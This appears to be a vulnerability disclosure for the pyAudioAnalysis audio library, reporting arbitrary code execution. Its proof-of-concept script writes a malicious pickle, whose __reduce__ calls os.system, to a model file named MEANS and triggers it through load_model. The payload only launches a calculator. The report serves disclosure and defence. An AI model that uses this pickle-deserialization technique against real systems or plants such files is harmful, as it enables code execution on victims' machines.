# Description

`pyAudioAnalysis` is an open Python library that provides a wide range of audio-related functionalities focusing on feature extraction, classification, segmentation and visualization issues. This package is vulnerable to `Arbitrary Code Execution`.

# Proof of Concept

# Installation
```bash
git clone https://github.com/tyiannak/pyAudioAnalysis.git
cd pyAudioAnalysis
pip install -r ./requirements.txt
pip install -e .
```

# Run exploit.py
```python
#!/usr/bin/env python3

import pickle
import os
from pyAudioAnalysis import audioTrainTest as aT

class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('calc.exe', ))

payload = pickle.dumps(EvilPickle())

with open('MEANS', 'wb') as file:
    file.write(payload)

aT.load_model('')
```
